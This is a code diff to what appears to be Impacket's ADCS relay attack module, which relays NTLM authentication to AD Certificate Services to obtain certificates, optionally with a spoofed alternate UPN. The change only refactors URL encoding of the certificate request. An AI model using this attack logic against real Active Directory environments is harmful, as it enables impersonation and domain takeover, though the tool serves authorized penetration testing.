@@ -16,7 +16,7 @@
 import re
 import base64
 from OpenSSL import crypto
-
+from urllib import parse
 from impacket import LOG
 
 # cache already attacked clients
@@ -38,13 +38,11 @@ class ADCSAttack:
             current_template = "Machine" if self.username.endswith("$") else "User"
 
         csr = self.generate_csr(key, self.username, self.config.altName)
-        csr = csr.decode().replace("\n", "").replace("+", "%2b").replace(" ", "+")
         LOG.info("CSR generated!")
 
         certAttrib = self.generate_certattributes(current_template, self.config.altName)
 
-        data = "Mode=newreq&CertRequest=%s&CertAttrib=%s&TargetStoreFlags=0&SaveCert=yes&ThumbPrint=" % (csr, certAttrib)
-
+        data = parse.urlencode({"Mode": "newreq", "CertRequest": csr, "CertAttrib": certAttrib, "TargetStoreFlags": 0, "SaveCert": "yes", "ThumbPrint": ""})
         headers = {
             "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
             "Content-Type": "application/x-www-form-urlencoded",
@@ -105,5 +103,5 @@ class ADCSAttack:
     def generate_certattributes(self, template, altName):
 
         if altName:
-            return "CertificateTemplate:{}%0d%0aSAN:upn={}".format(template, altName)
+            return "CertificateTemplate:{}\r\nSAN:upn={}".format(template, altName)
         return "CertificateTemplate:{}".format(template)
